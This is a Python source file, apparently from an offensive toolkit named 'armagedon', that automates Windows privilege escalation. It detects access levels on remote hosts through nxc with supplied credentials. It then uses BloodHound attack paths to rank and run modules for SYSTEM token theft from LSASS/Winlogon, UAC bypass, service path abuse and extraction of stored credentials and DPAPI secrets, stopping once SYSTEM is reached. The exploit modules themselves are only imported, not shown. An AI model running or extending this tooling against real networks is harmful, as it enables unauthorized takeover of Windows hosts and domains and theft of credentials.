"""Automatic privilege escalation orchestrator.

Discovers current privilege level, selects optimal privesc modules
(including BloodHound path-driven selection), executes them, and
verifies escalation after each attempt.

v2: Auto privilege detection, post-exploit verification, BloodHound integration.
"""

import importlib
import logging
import os
import re
import subprocess
from typing import Any, Dict, List, Optional, Tuple

from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.prompt import Prompt

log = logging.getLogger("armagedon.core.auto_privesc")
console = Console()


# ── Privilege Levels ────────────────────────────────────────────────────────
# Ordered from lowest to highest.  Verification compares position in this
# list — if the new level's index > old level's index, escalation succeeded.
PRIV_LEVELS = ["user", "admin", "system"]
PRIV_INDEX = {lv: i for i, lv in enumerate(PRIV_LEVELS)}

# ── Module Registry ─────────────────────────────────────────────────────────
# Each module declares: requirements (minimum priv to run), risk, and which
# BloodHound path types it can address.
PRIVESC_MODULES = {
    "token_steal": {
        "name": "Token Stealing",
        "description": "Duplicate SYSTEM token from Winlogon/LSASS via SeDebugPrivilege",
        "requirements": ["admin"],
        "risk": "medium",
        "bh_paths": ["SESSION_HIJACK", "DELEGATION_ABUSE", "ACL_ABUSE"],
        "priv_gain": "system",
    },
    "uac_bypass": {
        "name": "UAC Bypass",
        "description": "Bypass UAC via eventvwr / fodhelper / sdclt",
        "requirements": ["admin"],
        "risk": "low",
        "bh_paths": ["ADMIN_ACCESS"],
        "priv_gain": "admin_elevated",
    },
    "service_privesc": {
        "name": "Service Path Exploitation",
        "description": "Exploit weak service permissions or unquoted paths",
        "requirements": ["user"],
        "risk": "medium",
        "bh_paths": ["ACL_ABUSE", "ADMIN_ACCESS", "ACL_CHAIN"],
        "priv_gain": "system",
    },
    "stored_creds": {
        "name": "Stored Credentials",
        "description": "Extract saved creds, vault, WLAN passwords, DPAPI",
        "requirements": ["user"],
        "risk": "low",
        "bh_paths": ["GROUP_MEMBERSHIP", "PASSWORD_RESET", "ACL_ABUSE"],
        "priv_gain": "admin",
    },
}


# ── Privilege Detection ─────────────────────────────────────────────────────

def _run_cmd(cmd: str, timeout: int = 10) -> str:
    """Run a shell command, return stdout (empty on failure)."""
    try:
        r = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=timeout
        )
        return r.stdout.strip()
    except Exception:
        return ""


def detect_privilege_remote(target: str, user: str, passwd: str, domain: str) -> str:
    """Detect current privilege level on a remote Windows target via nxc.

    Returns one of: "system", "admin", "user"
    """
    log.info("Detecting privilege on %s (%s\\%s)", target, domain, user)

    # Method 1: nxc winrm — whoami /groups (checks for Administrators / SYSTEM)
    try:
        cmd = (
            f"nxc winrm {target} -u '{user}' -p '{passwd}' "
            f"--exec-method winrm -x 'whoami /groups'"
        )
        out = _run_cmd(cmd, timeout=15)
        if out:
            low = out.lower()
            if "s-1-5-18" in low or "\\everyone" in low and "system" in low:
                return "system"
            if "s-1-5-32-544" in low or "administrators" in low:
                return "admin"
            return "user"
    except Exception as e:
        log.debug("detect privilege via winrm failed: %s", e)

    # Method 2: nxc smb — check user group memberships
    try:
        cmd = (
            f"nxc smb {target} -u '{user}' -p '{passwd}' "
            f"--groups"
        )
        out = _run_cmd(cmd, timeout=15)
        if out:
            low = out.lower()
            if "administrators" in low:
                return "admin"
            if "domain admins" in low or "enterprise admins" in low:
                return "admin"
    except Exception as e:
        log.debug("detect privilege via smb failed: %s", e)

    # Method 3: nxc rdp — try to execute whoami
    try:
        cmd = (
            f"nxc rdp {target} -u '{user}' -p '{passwd}' "
            f"--exec 'whoami /priv' 2>/dev/null"
        )
        out = _run_cmd(cmd, timeout=10)
        if out:
            low = out.lower()
            if "SeDebugPrivilege" in out or "s-1-5-18" in low:
                return "admin"
    except Exception:
        pass

    log.warning("Could not detect privilege level, assuming 'user'")
    return "user"


def detect_privilege_local() -> str:
    """Detect current privilege level on local machine.

    Returns one of: "system", "admin", "user"
    """
    # Check for SYSTEM
    whoami = _run_cmd("whoami")
    if whoami and "nt authority\\system" in whoami.lower():
        return "system"

    # Check for admin group membership
    groups = _run_cmd("whoami /groups")
    if groups:
        low = groups.lower()
        if "s-1-5-32-544" in low or "administrators" in low:
            return "admin"
        if "s-1-5-18" in low:
            return "system"

    return "user"


def verify_privilege(target: str = "", user: str = "", passwd: str = "",
                     domain: str = "", is_remote: bool = True) -> str:
    """Re-check privilege level after a module attempt.

    Returns the current privilege level string.
    """
    if is_remote and target:
        return detect_privilege_remote(target, user, passwd, domain)
    return detect_privilege_local()


# ── BloodHound Integration ──────────────────────────────────────────────────

# Maps BloodHound path types to the privesc modules that can address them.
BH_PATH_TO_MODULE = {
    "SESSION_HIJACK":    ["token_steal"],
    "DELEGATION_ABUSE":  ["token_steal"],
    "ADMIN_ACCESS":      ["uac_bypass", "service_privesc"],
    "ACL_ABUSE":         ["service_privesc", "stored_creds"],
    "ACL_CHAIN":         ["service_privesc"],
    "GROUP_MEMBERSHIP":  ["stored_creds"],
    "PASSWORD_RESET":    ["stored_creds"],
    "RBCD_ABUSE":        ["token_steal"],
    "SID_HISTORY":       ["token_steal"],
    "DCOM_ABUSE":        ["token_steal"],
}


def rank_modules_by_bloodhound(
    attack_paths: list,
    current_priv: str,
) -> List[Tuple[str, dict, str]]:
    """Rank privesc modules based on BloodHound attack paths.

    Returns list of (module_id, module_meta, reason) sorted by relevance.
    Modules that address discovered BH paths are ranked higher.
    """
    # Count how many BH paths each module addresses
    module_score: Dict[str, int] = {}
    module_reasons: Dict[str, str] = {}

    for path in attack_paths:
        path_type = getattr(path, "path_type", "")
        severity = getattr(path, "severity", "")
        target_name = getattr(path, "target_name", "")

        # Find modules that handle this path type
        for mod_id in BH_PATH_TO_MODULE.get(path_type, []):
            module_score[mod_id] = module_score.get(mod_id, 0) + (
                3 if severity == "critical" else 2 if severity == "high" else 1
            )
            reason = f"BH path: {path_type} → {target_name}"
            if mod_id not in module_reasons:
                module_reasons[mod_id] = reason
            else:
                module_reasons[mod_id] += f" | {reason}"

    # Also add modules compatible with current privilege level
    for mod_id, meta in PRIVESC_MODULES.items():
        req_priv = meta["requirements"][0] if meta["requirements"] else "user"
        if PRIV_INDEX.get(current_priv, 0) >= PRIV_INDEX.get(req_priv, 0):
            if mod_id not in module_score:
                module_score[mod_id] = 0
                module_reasons[mod_id] = "compatible with current privilege"

    # Sort by score (descending), then by risk (low first)
    risk_order = {"low": 0, "medium": 1, "high": 2}
    ranked = []
    for mod_id, score in module_score.items():
        meta = PRIVESC_MODULES[mod_id]
        ranked.append((mod_id, meta, module_reasons.get(mod_id, "")))

    ranked.sort(
        key=lambda x: (
            -module_score.get(x[0], 0),           # higher BH score first
            risk_order.get(x[1]["risk"], 99),      # lower risk first
        )
    )
    return ranked


def rank_modules_by_privilege(current_priv: str) -> List[Tuple[str, dict, str]]:
    """Rank privesc modules based solely on current privilege level.

    Falls back to this when no BloodHound data is available.
    """
    ranked = []
    risk_order = {"low": 0, "medium": 1, "high": 2}

    for mod_id, meta in PRIVESC_MODULES.items():
        req_priv = meta["requirements"][0] if meta["requirements"] else "user"
        if PRIV_INDEX.get(current_priv, 0) >= PRIV_INDEX.get(req_priv, 0):
            ranked.append((mod_id, meta, f"meets requirement: {req_priv}"))

    ranked.sort(key=lambda x: risk_order.get(x[1]["risk"], 99))
    return ranked


# ── Main Orchestrator ───────────────────────────────────────────────────────

class AutoPrivesc:
    """Orchestrate privilege escalation on a target.

    Features:
      - Auto-detect current privilege level (remote or local)
      - BloodHound path-driven module selection
      - Post-exploit verification after each attempt
      - Smart stop when SYSTEM is reached
    """

    def __init__(self, target: str = "", session_id: str = ""):
        self.target = target
        self.session_id = session_id
        self.results: Dict[str, dict] = {}
        self._bh_paths: list = []
        self._current_priv: str = "user"
        self._creds: Dict[str, str] = {}  # user/passwd/domain for remote ops

    # ── BloodHound Integration ──────────────────────────────────────────

    def set_bloodhound_paths(self, paths: list):
        """Set BloodHound attack paths for module selection."""
        self._bh_paths = paths
        log.info("Loaded %d BloodHound attack paths for privesc selection", len(paths))

    def set_creds(self, user: str, passwd: str, domain: str):
        """Set credentials for remote privilege detection."""
        self._creds = {"user": user, "passwd": passwd, "domain": domain}

    # ── Module Listing ──────────────────────────────────────────────────

    def list_privesc_modules(self) -> list:
        """Return available privesc modules."""
        return [{"id": mid, **meta} for mid, meta in PRIVESC_MODULES.items()]

    def display_privesc_options(self):
        """Print privesc modules table."""
        table = Table(title="Privilege Escalation Modules")
        table.add_column("#", style="cyan")
        table.add_column("Module", style="yellow")
        table.add_column("Description", style="white")
        table.add_column("Risk", style="red")
        table.add_column("Requirements", style="blue")
        table.add_column("BH Paths", style="magenta")

        for i, m in enumerate(self.list_privesc_modules(), 1):
            table.add_row(
                str(i), m["id"], m["description"], m["risk"],
                ", ".join(m["requirements"]),
                ", ".join(m.get("bh_paths", [])),
            )
        console.print(table)
        return table

    # ── Module Execution ────────────────────────────────────────────────

    def run_module(self, module_id: str, mode: str = "EXPLOIT", **kwargs) -> dict:
        """Execute a specific privesc module."""
        meta = PRIVESC_MODULES.get(module_id, {})
        log.info("Running privesc module: %s target=%s mode=%s", module_id, self.target, mode)
        console.print(
            Panel(
                f"[bold yellow]Running privesc: {module_id}[/] ({meta.get('risk', '?')} risk)",
                border_style="yellow",
            )
        )

        result = {"success": False, "data": None, "error": None, "module": module_id}

        try:
            mod = importlib.import_module(f"armagedon.modules.privesc.{module_id}")
            if hasattr(mod, "run"):
                out = mod.run(target=self.target, mode=mode, **kwargs)
                result["success"] = out.get("success", False)
                result["data"] = out
            else:
                result["error"] = "Module has no run() function"
        except ImportError:
            result["error"] = f"Module {module_id} not found"
        except Exception as e:
            result["error"] = str(e)

        if result["error"]:
            log.warning("Privesc %s failed: %s", module_id, result["error"])
            console.print(f"  [red]Failed: {result['error']}[/]")
        else:
            log.info("Privesc %s completed (success=%s)", module_id, result.get("success"))
            if result.get("success"):
                console.print(f"  [green]Module reported success[/]")
            else:
                console.print(f"  [yellow]Module completed but no success signal[/]")

        self.results[module_id] = result
        return result

    # ── Interactive Mode ────────────────────────────────────────────────

    def interactive_run(self):
        """List modules, let user pick one, execute."""
        self.display_privesc_options()
        try:
            choice = int(Prompt.ask("Select module to run", default="0"))
            modules = self.list_privesc_modules()
            if 1 <= choice <= len(modules):
                selected = modules[choice - 1]
                return self.run_module(selected["id"])
        except (ValueError, TypeError):
            pass
        console.print("[yellow]Canceled.[/]")
        return None

    # ── Auto Escalation ─────────────────────────────────────────────────

    def auto_escalate(
        self,
        current_privilege: str = "",
        is_remote: bool = True,
        user: str = "",
        passwd: str = "",
        domain: str = "",
        bloodhound_paths: list = None,
    ) -> dict:
        """Full auto-escalation: detect → select → run → verify → repeat.

        Flow:
          1. Auto-detect current privilege (if not provided)
          2. Select modules ranked by BloodHound paths (if available)
          3. Execute modules in order (low risk first)
          4. After EACH module, verify if privilege level increased
          5. Stop when SYSTEM reached or all modules exhausted

        Args:
            current_privilege: Pre-detected level ("user"/"admin"/"system").
                               If empty, auto-detects.
            is_remote: True for remote target, False for local.
            user/passwd/domain: Credentials for remote privilege detection.
            bloodhound_paths: BloodHound AttackPath objects for smart selection.

        Returns:
            dict with status, final_privilege, module that succeeded, results.
        """
        creds = {"user": user or self._creds.get("user", ""),
                 "passwd": passwd or self._creds.get("passwd", ""),
                 "domain": domain or self._creds.get("domain", "")}

        if bloodhound_paths:
            self.set_bloodhound_paths(bloodhound_paths)

        # ── Step 1: Detect current privilege ────────────────────────────
        console.print(Panel(
            "[bold yellow]A U T O   P R I V I L E G E   E S C A L A T I O N[/]",
            border_style="yellow",
        ))

        if current_privilege and current_privilege in PRIV_LEVELS:
            self._current_priv = current_privilege
            console.print(f"  [dim]Provided privilege level: {current_privilege}[/]")
        else:
            console.print("  [cyan]Detecting current privilege level...[/]")
            if is_remote and self.target:
                self._current_priv = detect_privilege_remote(
                    self.target, creds["user"], creds["passwd"], creds["domain"]
                )
            else:
                self._current_priv = detect_privilege_local()
            console.print(f"  [green]Current privilege: [bold]{self._current_priv}[/][/]")
            log.info("Detected privilege: %s", self._current_priv)

        # Already SYSTEM? Nothing to do.
        if self._current_priv == "system":
            console.print("[green][bold]Already SYSTEM — no escalation needed.[/][/]")
            return {
                "status": "already_system",
                "final_privilege": "system",
                "module": None,
                "results": [],
            }

        # ── Step 2: Select modules ──────────────────────────────────────
        if self._bh_paths:
            console.print("  [cyan]Using BloodHound paths for module selection...[/]")
            ranked = rank_modules_by_bloodhound(self._bh_paths, self._current_priv)
        else:
            console.print("  [dim]No BloodHound data — using privilege-based selection[/]")
            ranked = rank_modules_by_privilege(self._current_priv)

        if not ranked:
            console.print("[red]No applicable privesc modules for current privilege.[/]")
            return {
                "status": "no_modules",
                "final_privilege": self._current_priv,
                "module": None,
                "results": [],
            }

        # Display selection plan
        sel_table = Table(title="Module Execution Plan")
        sel_table.add_column("#", style="cyan")
        sel_table.add_column("Module", style="yellow")
        sel_table.add_column("Risk", style="red")
        sel_table.add_column("Priv Gain", style="green")
        sel_table.add_column("Reason", style="dim")
        for i, (mod_id, meta, reason) in enumerate(ranked, 1):
            sel_table.add_row(
                str(i), mod_id, meta["risk"],
                meta.get("priv_gain", "?"), reason[:60],
            )
        console.print(sel_table)

        # ── Step 3: Execute + Verify ────────────────────────────────────
        results_summary = []
        pre_priv = self._current_priv

        for mod_id, meta, reason in ranked:
            console.print(
                f"\n  [cyan]▶ Trying {mod_id}[/] ({meta['risk']} risk) — {reason[:50]}"
            )

            result = self.run_module(mod_id)
            results_summary.append({
                "module": mod_id,
                "success": result.get("success", False),
                "error": result.get("error"),
            })

            # ── Step 4: Verify privilege change ─────────────────────────
            console.print("  [cyan]Verifying privilege level...[/]")
            new_priv = verify_privilege(
                target=self.target,
                user=creds["user"], passwd=creds["passwd"],
                domain=creds["domain"],
                is_remote=is_remote,
            )

            if PRIV_INDEX.get(new_priv, 0) > PRIV_INDEX.get(pre_priv, 0):
                console.print(
                    f"  [bold green]PRIVILEGE ESCALATED: {pre_priv} → {new_priv}[/]"
                )
                log.info("Escalated via %s: %s → %s", mod_id, pre_priv, new_priv)
                self._current_priv = new_priv

                # ── Step 5: Stop if SYSTEM ──────────────────────────────
                if new_priv == "system":
                    console.print("[bold green]═══ SYSTEM ACCESS ACHIEVED ═══[/]")
                    return {
                        "status": "escalated",
                        "final_privilege": "system",
                        "escalation_chain": f"{pre_priv} → {new_priv} via {mod_id}",
                        "module": mod_id,
                        "results": results_summary,
                    }

                pre_priv = new_priv
            else:
                console.print(f"  [dim]Privilege unchanged: {new_priv}[/]")

        # ── Exhausted all modules ───────────────────────────────────────
        console.print(f"\n[yellow]All modules exhausted. Final privilege: {self._current_priv}[/]")
        return {
            "status": "exhausted" if self._current_priv == pre_priv else "partial",
            "final_privilege": self._current_priv,
            "escalation_chain": f"{pre_priv} → {self._current_priv}" if self._current_priv != pre_priv else None,
            "module": None,
            "results": results_summary,
        }

    # ── BloodHound-Driven Full Chain ────────────────────────────────────

    def bloodhound_auto_escalate(
        self,
        bloodhound_analyzer,
        source_sid: str = "",
        **creds,
    ) -> dict:
        """Full chain: BloodHound path discovery → privesc module selection → execute.

        Args:
            bloodhound_analyzer: BloodHoundAnalyzer instance (already loaded).
            source_sid: SID to start from. If empty, uses first owned node.
            **creds: user, passwd, domain for remote ops.

        Returns:
            dict with path analysis + escalation results.
        """
        console.print(Panel(
            "[bold magenta]BLOODHOUND → PRIVILEGE ESCALATION CHAIN[/]",
            border_style="magenta",
        ))

        # Find attack paths
        if not source_sid:
            # Try to find an owned node
            for oid, node in bloodhound_analyzer.nodes.items():
                if node.is_owned:
                    source_sid = oid
                    break
            if not source_sid:
                console.print("[red]No owned node found. Provide --source SID.[/]")
                return {"status": "no_source", "paths": [], "escalation": None}

        src_node = bloodhound_analyzer.nodes.get(source_sid)
        src_name = src_node.display_name if src_node else "?"
        console.print(f"  [cyan]Source: {src_name}[/]")

        paths = bloodhound_analyzer.find_attack_paths(source_sid)
        console.print(f"  [cyan]Found {len(paths)} attack paths[/]")

        if paths:
            bloodhound_analyzer.print_paths()

        # Run auto-escalate with BH paths
        escalation = self.auto_escalate(
            is_remote=True,
            bloodhound_paths=paths,
            **creds,
        )

        return {
            "status": "complete",
            "source_sid": source_sid,
            "paths": [
                {
                    "type": p.path_type,
                    "severity": p.severity,
                    "effort": p.effort,
                    "source": p.source_name,
                    "target": p.target_name,
                    "module": p.auto_exec_module,
                }
                for p in paths
            ],
            "escalation": escalation,
        }
